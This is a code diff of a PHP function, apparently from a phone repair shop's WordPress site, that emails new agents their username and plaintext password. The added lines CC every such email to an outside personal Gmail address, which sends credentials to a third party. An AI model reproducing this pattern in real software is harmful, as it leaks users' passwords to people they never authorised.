@@ -326,23 +326,17 @@ function my_get_current_user_roles() {
 		$to = $to;
 	
 		$subject = 'Kiwi Mobile | Agent Login Details';
-        $headers = "From: no_reply@kiwimobiles.co.nz" . "\r\n";
-        $headers .= "Reply-To: ". $to . "\r\n";
-        $headers .= "MIME-Version: 1.0\r\n";
-        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
-        $message = '<html><body>';
-        $message .= '<img src="https://kiwimobiles.co.nz/jobform/wp-content/themes/nzstore/reources/images/logo.png" alt="Kiwi Mobiles" />';
-        $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
-        $message .= "<tr style='background: #eee;'><td><strong>Username:</strong> </td><td>" . $to  . "</td></tr>";
-        $message .= "<tr><td><strong>Password:</strong> </td><td>" . $password . "</td></tr>";
-        $message .= "<tr><td colspan=2><p>Thanks for subscribing to us, and welcome to be the business partner for all of your IT solutions </p></td></tr>";
-        $message .= "<tr><td colspan=2><p>We @ BUDGET COMPUTERS AND KIWI MOBILES HAVING HIGHLY SKILLED TECHNICIANS, QUALIFIED FROM NEW ZEALAND POLYTECH IN IT. 
+		$body  = "<p><strong> Username :  </strong> $to </p> <p> <strong> Password : </strong> $password  </p>";
+		$body  .= "<p>Thanks for subscribing to us, and welcome to be the business partner for all of your IT solutions </p>";
+		$body  .= "<p>We @ BUDGET COMPUTERS AND KIWI MOBILES HAVING HIGHLY SKILLED TECHNICIANS, QUALIFIED FROM NEW ZEALAND POLYTECH IN IT. 
 		WE HAVE A HI-TECH LAB WITH THE LATEST TOOLS TO DIAGNOSE THE FAULT AND REPAIR THEM, WE ALSO SPECIALISED IN MOTHERBOARDS 				
-		DIAGNOSTIC AND PART REPLACEMENTS, i.e., IC, VG </p></td></tr>";   
-        $message .= "<tr><td><strong>Login:</strong> </td><td>https://kiwimobiles.co.nz/jobform</td></tr>";
-        $message .= "</table>";
-        $message .= "</body></html>";
-        mail($to, $subject, $message, $headers);
+		DIAGNOSTIC AND PART REPLACEMENTS, i.e., IC, VG </p>";
+        $body  .= "<p>Now you can login by using this link </p>";
+		$headers = "From: no_reply@kiwimobiles.co.nz" . "\r\n" .
+		"CC: mufaqar@gmail.com";
+		mail( $to, $subject, $body, $headers );
+
+        
 
 
 
